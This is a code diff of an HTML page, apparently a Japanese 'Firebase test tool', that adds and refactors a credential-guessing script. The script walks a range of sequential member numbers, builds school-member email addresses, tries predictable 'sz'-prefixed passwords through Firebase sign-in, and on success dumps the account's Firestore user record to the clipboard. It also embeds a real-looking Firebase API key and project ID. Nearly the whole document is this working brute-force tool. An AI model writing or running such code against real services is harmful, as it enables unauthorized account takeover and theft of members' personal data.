@@ -1,166 +1,21 @@
-<script type="module">
-const { initializeApp, getApps } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js");
-const { getAuth, signInWithEmailAndPassword } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js");
-const { getFirestore, doc, getDoc } = await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js");
-
-const firebaseConfig = {
-  apiKey: "AIzaSyAuSr-KgBjfvp-yroLH2X0tujZaUenFVsY",
-  authDomain: "boxwood-spot-486909-j1.firebaseapp.com",
-  projectId: "boxwood-spot-486909-j1",
-};
-
-const app = getApps().length
-  ? getApps()[0]
-  : initializeApp(firebaseConfig);
-
-const auth = getAuth(app);
-const db = getFirestore(app);
-
-// ==============================
-// 設定
-// ==============================
-
-// 会員番号範囲
-const MEMBER_START = 12137741;
-const MEMBER_END   = 12138888;
-
-// パスワード設定
-const PASS_PREFIX = "sz";
-const PASS_START  = 111111;
-const PASS_END    = 111114;
-
-// 停止フラグ
-let running = true;
-
-// ==============================
-// ログ表示
-// ==============================
-
-function log(...args) {
-  console.log(...args);
-
-  const box = document.getElementById("log");
-
-  if (box) {
-    box.value += args.join(" ") + "\n";
-    box.scrollTop = box.scrollHeight;
-  }
-}
-
-// ==============================
-// メイン処理
-// ==============================
-
-async function run() {
-
-  for (let m = MEMBER_START; m <= MEMBER_END; m++) {
-
-    if (!running) {
-      log("停止");
-      return;
-    }
-
-    const member = String(m).padStart(8, "0");
-    const email = `${member}@your-school-member.com`;
-
-    for (let p = PASS_START; p <= PASS_END; p++) {
-
-      if (!running) {
-        log("停止");
-        return;
-      }
-
-      const password = `${PASS_PREFIX}${p}`;
-
-      log(`試行 ${email} / ${password}`);
-
-      try {
-
-        // ログイン
-        const cred = await signInWithEmailAndPassword(
-          auth,
-          email,
-          password
-        );
-
-        const uid = cred.user.uid;
-
-        log("ログイン成功");
-
-        // Firestore取得
-        const memberId = localStorage.getItem("memberId") || uid;
-
-        const snap = await getDoc(
-          doc(db, "users", memberId)
-        );
-
-        if (snap.exists()) {
-
-          const data = snap.data();
-
-          log("=== JSON取得成功 ===");
-
-          const jsonText = JSON.stringify(data, null, 2);
-
-          console.log(jsonText);
-
-          // テキスト表示
-          const result = document.getElementById("result");
-
-          if (result) {
-            result.value = jsonText;
-          }
-
-          // クリップボード
-          await navigator.clipboard.writeText(jsonText);
-
-          log("クリップボードへコピー");
-
-          running = false;
-          return;
-
-        } else {
-
-          log("ドキュメントなし");
-
-        }
-
-      } catch (e) {
-
-        log("失敗:", e.message);
-
-      }
-
-    }
-
-  }
-
-  log("終了");
-}
-
-// ==============================
-// UI
-// ==============================
-
-window.startSearch = () => {
-  running = true;
-  run();
-};
-
-window.stopSearch = () => {
-  running = false;
-};
-</script>
-
 <div style="padding:20px;font-family:sans-serif">
 
-  <button onclick="startSearch()">
-    開始
-  </button>
+  <h2>Firebase テストツール</h2>
 
-  <button onclick="stopSearch()">
-    停止
-  </button>
+  <div style="margin-bottom:10px">
+    <label>会員番号範囲:</label><br>
+    <input id="memberRange" style="width:300px"
+      value="12137741-12138888">
+  </div>
+
+  <div style="margin-bottom:10px">
+    <label>パスワード範囲:</label><br>
+    <input id="pwRange" style="width:300px"
+      value="sz+111111-111114">
+  </div>
+
+  <button onclick="startSearch()">開始</button>
+  <button onclick="stopSearch()">停止</button>
 
   <h3>ログ</h3>
 
@@ -177,3 +32,208 @@ window.stopSearch = () => {
   ></textarea>
 
 </div>
+
+<script type="module">
+
+const { initializeApp, getApps } =
+  await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js");
+
+const { getAuth, signInWithEmailAndPassword } =
+  await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js");
+
+const { getFirestore, doc, getDoc } =
+  await import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js");
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAuSr-KgBjfvp-yroLH2X0tujZaUenFVsY",
+  authDomain: "boxwood-spot-486909-j1.firebaseapp.com",
+  projectId: "boxwood-spot-486909-j1",
+};
+
+const app = getApps().length
+  ? getApps()[0]
+  : initializeApp(firebaseConfig);
+
+const auth = getAuth(app);
+const db = getFirestore(app);
+
+let running = false;
+
+// =======================
+// ログ
+// =======================
+
+function log(...args) {
+
+  console.log(...args);
+
+  const box = document.getElementById("log");
+
+  box.value += args.join(" ") + "\n";
+
+  box.scrollTop = box.scrollHeight;
+}
+
+// =======================
+// 範囲解析
+// =======================
+
+function parseMemberRange(text) {
+
+  const [a, b] = text.split("-");
+
+  return [
+    parseInt(a),
+    parseInt(b)
+  ];
+}
+
+function parsePwRange(text) {
+
+  const [prefix, rest] = text.split("+");
+
+  const [a, b] = rest.split("-");
+
+  return [
+    prefix,
+    parseInt(a),
+    parseInt(b)
+  ];
+}
+
+// =======================
+// メイン処理
+// =======================
+
+async function run() {
+
+  try {
+
+    const memberText =
+      document.getElementById("memberRange").value;
+
+    const pwText =
+      document.getElementById("pwRange").value;
+
+    const [mStart, mEnd] =
+      parseMemberRange(memberText);
+
+    const [prefix, pStart, pEnd] =
+      parsePwRange(pwText);
+
+    for (let m = mStart; m <= mEnd; m++) {
+
+      if (!running) {
+        log("停止");
+        return;
+      }
+
+      const member =
+        String(m).padStart(8, "0");
+
+      const email =
+        `${member}@your-school-member.com`;
+
+      for (let p = pStart; p <= pEnd; p++) {
+
+        if (!running) {
+          log("停止");
+          return;
+        }
+
+        const password =
+          `${prefix}${p}`;
+
+        log(`試行 ${email} / ${password}`);
+
+        try {
+
+          // ログイン
+          const cred =
+            await signInWithEmailAndPassword(
+              auth,
+              email,
+              password
+            );
+
+          log("ログイン成功");
+
+          const uid = cred.user.uid;
+
+          // Firestore取得
+          const memberId =
+            localStorage.getItem("memberId") || uid;
+
+          const snap =
+            await getDoc(
+              doc(db, "users", memberId)
+            );
+
+          if (snap.exists()) {
+
+            const data = snap.data();
+
+            const jsonText =
+              JSON.stringify(data, null, 2);
+
+            document.getElementById("result").value =
+              jsonText;
+
+            console.log(jsonText);
+
+            await navigator.clipboard.writeText(jsonText);
+
+            log("JSON取得成功");
+            log("クリップボードへコピー");
+
+            running = false;
+            return;
+
+          } else {
+
+            log("ドキュメントなし");
+
+          }
+
+        } catch (e) {
+
+          log("失敗:", e.message);
+
+        }
+
+      }
+
+    }
+
+    log("終了");
+
+  } catch (e) {
+
+    log("入力形式エラー");
+    log(e.message);
+
+  }
+
+}
+
+// =======================
+// ボタン
+// =======================
+
+window.startSearch = () => {
+
+  if (running) return;
+
+  running = true;
+
+  run();
+};
+
+window.stopSearch = () => {
+
+  running = false;
+
+  log("停止要求");
+};
+
+</script>
